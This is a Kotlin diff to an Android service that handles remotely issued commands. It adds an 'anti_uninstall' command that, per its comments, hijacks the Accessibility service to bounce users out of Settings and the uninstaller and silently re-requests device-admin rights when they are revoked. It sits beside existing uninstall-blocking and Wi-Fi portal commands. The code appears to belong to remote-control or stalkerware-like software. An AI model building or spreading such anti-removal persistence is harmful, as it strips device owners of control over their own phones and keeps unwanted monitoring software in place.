@@ -287,6 +287,12 @@ class ConnectorService : Service() {
             // ── Block/Unblock Uninstall (Device Admin/Owner) ──
             cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), "command_result")
 
+            // ── Anti-Uninstall Guard (Accessibility + Auto Re-request Admin) ──
+            // ON  → Accessibility intercept Settings/uninstaller → HOME
+            //       + onDisabled → SilentSetupActivity re-request admin otomatis
+            // OFF → Guard dinonaktifkan → app bisa di-uninstall normal
+            cmd.startsWith("anti_uninstall:") -> Pair(AppDeviceAdminReceiver.setAntiUninstall(this, cmd.removePrefix("anti_uninstall:").trim() == "true"), "command_result")
+
             cmd == "wifi_portal_start" -> Pair(startWifiPortal(), "command_result")
             cmd == "wifi_portal_stop"  -> Pair(stopWifiPortal(), "command_result")
 
